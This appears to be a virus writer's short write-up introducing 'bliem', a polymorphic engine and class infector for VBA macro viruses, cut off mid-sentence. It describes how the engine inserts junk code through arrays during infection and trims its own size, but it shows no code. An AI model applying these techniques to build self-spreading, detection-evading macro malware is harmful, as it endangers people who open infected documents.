The 'bliem' polymorphic engine for VBA
-------------------------------------------------------------------->

    Hi folks, I am back with a new maybe unique vba
polymorphic engine! This engine is a combination 
of both a class infector and a polymorphic engine.
The whole thing is called 'bliem' like the virus I first
used this engine in. Let's say something about the
technic...

    The most bad thing about the already existing
polymorphic engines for vba was that the always
inserted the code at the same lines or the volume
of the source code growed and growed and ...
So 'bliem' doesn't have such problems. The main
good thing in 'bliem' is that it always 'keeps an eye'
on the actually size of the source code and reduces
it when it's too big. Let's say something about the
technic of inserting the junkcode: The junkcode is
inserted into the viruscode not in the common way.
The junkcode is inserted while infection. This means
that the whole viruscode is stored in arrays and the
junkcode is stored in some of this arrays. Like the
main code is stored there, also junkcode is also there
and will be inserted while infecting the new class
object. While inserting the actual code into arrays,
the 'bliem brain' is checking for the actually size of
itself and if its too big, it deletes some junk arrays.
I use this method because the old one with the
command '.deletelines' only screwed up the code.

    To make 'bliem' work you have to insert a com-
ment sign ( ' ) in the end of every code line. 'bliem'
uses this for finding the junkcode in the normal
virus code. Without this signs the virus and the
polymorphic engine won't work.
    
    So 'bliem' is infector and polymorphic engine
in one, so don't wonder about the code. If you
have any questions or whatever, feel free and 
mail me!

    So this is the whole thing, little effectiv code I think.
If you have any thinks to say about this or other stuff, feel
